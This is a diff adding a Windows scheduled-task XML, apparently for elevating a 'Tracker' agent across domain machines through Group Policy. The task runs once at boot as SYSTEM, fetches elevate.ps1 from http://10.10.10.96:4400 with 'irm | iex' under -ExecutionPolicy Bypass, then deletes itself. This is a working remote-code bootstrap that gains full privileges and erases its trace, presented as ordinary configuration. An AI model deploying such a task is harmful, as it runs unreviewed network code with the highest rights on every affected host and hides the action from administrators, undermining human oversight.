@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="UTF-16"?>
+<!--
+  Windows farm elevation via Group Policy (domain-joined nodes).
+  Import this as a Group Policy Preferences Scheduled Task, OR deploy with:
+     schtasks /create /xml TrackerElevate-GPO-Task.xml /tn TrackerElevateBootstrap
+  GPP/SYSTEM context creates it with the rights a local non-elevated process can't.
+  It runs ONCE at startup as SYSTEM, pulls elevate.ps1, and self-deletes.
+-->
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>One-shot: register the elevated Tracker agent, then remove self.</Description>
+    <URI>\TrackerElevateBootstrap</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+    </BootTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+    <ExecutionTimeLimit>PT15M</ExecutionTimeLimit>
+    <Enabled>true</Enabled>
+    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>powershell.exe</Command>
+      <Arguments>-NoProfile -ExecutionPolicy Bypass -Command "irm http://10.10.10.96:4400/elevate.ps1 | iex; schtasks /delete /tn TrackerElevateBootstrap /f"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
